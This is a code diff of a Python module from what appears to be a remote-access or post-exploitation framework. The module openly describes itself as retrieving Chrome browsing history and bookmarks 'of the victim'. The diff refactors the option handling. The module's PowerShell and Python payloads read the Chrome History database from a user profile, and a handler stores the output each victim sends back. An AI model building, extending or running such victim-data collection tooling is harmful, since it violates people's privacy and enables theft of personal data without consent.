@@ -13,16 +13,17 @@ class Browser_History(Module):
 	@classmethod
 	def module_options(cls):
 		h = {
-			'Path' : 'Path to dump the history and bookmarks.' 
+			'path' : 'Path to dump the history and bookmarks.' 
 		}
 		return h
 
-	def __init__(self,name,utility,language):
+	def __init__(self,name,utility,language,options):
 
 		description = 'This module retrieves the browser history and bookmarks from chrome browser of the victim.'
+		## We are loading the script in the script variable here
+		super(Browser_History, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")(options))    
 
-		super(Browser_History, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")())    
-
+	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
 	def handle_task_output(self,data,options,victim_id):
 		## Comes as a bytes object, so changing to string
 		output = data.decode('utf-8')
@@ -37,11 +38,11 @@ class Browser_History(Module):
 		filename = "browserhistory_"+time.strftime("%Y%m%d-%H%M%S")+".txt"
 		file_path = os.path.join(dump_path,filename)
 
-		if 'Path' in  options:
-			if not os.path.exists(options['Path']):
-				print(f"Provided save path does not exists - {options['Path']}. Saving to default directory {ss_path}")
+		if 'path' in  options:
+			if not os.path.exists(options['path']):
+				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {ss_path}")
 			else:
-				file_path = os.path.join(options['Path'],filename)
+				file_path = os.path.join(options['path'],filename)
 
 		f = open(file_path,'w+')
 		print(output,file=f)
@@ -49,7 +50,7 @@ class Browser_History(Module):
 		return output
     
 
-	def script_powershell(self):
+	def script_powershell(self,options):
 		return """function Get-ChromeHistory {
 	    $Path = "$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
 	    if (-not (Test-Path -Path $Path)) {
@@ -109,7 +110,7 @@ class Browser_History(Module):
 
 
 	return $history + $bookmarks"""
-	def script_python(self):
+	def script_python(self,options):
 		return """def execute_command():
 		import platform
 		import os
